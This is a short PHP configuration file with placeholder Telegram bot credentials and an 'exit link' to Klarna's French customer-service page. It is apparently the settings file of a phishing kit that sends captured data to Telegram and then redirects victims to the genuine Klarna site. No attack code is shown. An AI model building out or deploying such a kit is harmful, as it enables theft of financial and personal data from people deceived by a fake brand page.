<?php


// telegram information
$token = "xxx";
$id = "xxx";

// exit link
$exit = "https://www.klarna.com/fr/service-client/";



?>